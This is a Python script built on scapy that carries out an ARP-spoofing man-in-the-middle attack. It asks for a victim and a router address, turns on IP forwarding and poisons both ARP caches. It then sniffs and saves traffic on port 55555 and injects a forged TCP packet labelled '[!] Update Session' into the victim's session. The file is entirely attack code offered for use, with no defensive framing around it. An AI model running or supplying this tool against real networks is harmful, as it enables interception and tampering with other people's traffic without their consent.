import os
import sys
import socket
from scapy.all import*
import forge

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def Spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def Restore(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def sniffer(interface, routerIP, victimIP, eve):
    pkts = sniff(count = 25, filter="dst port 55555 or src port 55555" ,prn=lambda pkt: "%s: %s" % (pkt.sniffed_on, pkt.show()))
    print(pkts)
    wrpcap("sniffed.pcap", pkts)

    badPacket = IP(src= victimIP, dst=victimIP)/TCP(sport=55555, dport=pkts[0].sport)/"[!] Update Session"
    send(badPacket, iface=None)
    wrpcap("aggressive.pcap", badPacket)

def MiddleMan():
    eve = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interface = input("interface: \n") #
    victimIP = input("victim: \n") 
    routerIP= input("router: \n") 
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            Spoof(routerIP, victimIP)
            sniffer(interface, routerIP, victimIP, eve)
            print('never escape')
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()